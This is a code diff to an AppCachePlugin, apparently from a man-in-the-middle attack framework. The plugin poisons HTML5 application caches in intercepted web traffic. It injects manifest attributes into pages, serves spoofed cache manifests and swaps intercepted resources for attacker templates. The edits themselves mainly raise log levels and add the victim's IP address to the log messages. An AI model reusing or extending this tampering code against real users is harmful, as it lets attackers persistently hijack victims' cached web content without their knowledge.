@@ -38,20 +38,22 @@ class AppCachePlugin(Plugin):
         if "enable_only_in_useragents" in self.config:
             regexp = self.config["enable_only_in_useragents"]
             if regexp and not re.search(regexp,req_headers["user-agent"]):
-                logging.debug("Tampering disabled in this useragent (%s)" % (req_headers["user-agent"]))
+                logging.info("%s Tampering disabled in this useragent (%s)" % (ip, req_headers["user-agent"]))
                 return {'request': request, 'data': data}
                
         urls = self.urlMonitor.getRedirectionSet(url)
-        
+        logging.debug("%s [AppCachePoison] Got redirection set: %s" % (ip, urls))
         (name,s,element,url) = self.getSectionForUrls(urls)
+
         if s is False:
           data = self.tryMassPoison(url, data, headers, req_headers, ip)
           return {'request': request, 'data': data}
 
-        logging.debug("Found URL %s in section %s" % (url, name))
+        logging.info("%s Found URL %s in section %s" % (ip, url, name))
         p = self.getTemplatePrefix(s)
+
         if element == 'tamper':
-          logging.debug("Poisoning tamper URL with template %s" % (p))
+          logging.info("%s Poisoning tamper URL with template %s" % (ip, p))
           if os.path.exists(p + '.replace'): # replace whole content
             f = open(p + '.replace','r')
             data = self.decorate(f.read(), s)
@@ -68,12 +70,12 @@ class AppCachePlugin(Plugin):
           data = re.sub(re.compile("<html",re.IGNORECASE),"<html manifest=\"" + self.getManifestUrl(s)+"\"", data)
           
         elif element == "manifest":
-          logging.debug("Poisoning manifest URL")
+          logging.info("%s Poisoning manifest URL" % ip)
           data = self.getSpoofedManifest(url, s)
           headers.setRawHeaders("Content-Type", ["text/cache-manifest"])
 
         elif element == "raw": # raw resource to modify, it does not have to be html
-          logging.debug("Poisoning raw URL")
+          logging.info("%s Poisoning raw URL" % ip)
           if os.path.exists(p + '.replace'): # replace whole content
             f = open(p + '.replace','r')
             data = self.decorate(f.read(), s)
@@ -164,12 +166,16 @@ class AppCachePlugin(Plugin):
               if isinstance(self.config[i], dict): #section
                 section = self.config[i]
                 name = i
+                
                 if section.get('tamper_url',False) == url:
                   return (name, section, 'tamper',url)
+                
                 if section.has_key('tamper_url_match') and re.search(section['tamper_url_match'], url):
                   return (name, section, 'tamper',url)
+                
                 if section.get('manifest_url',False) == url:
                   return (name, section, 'manifest',url)
+
                 if section.get('raw_url',False) == url:
                   return (name, section, 'raw',url)
 
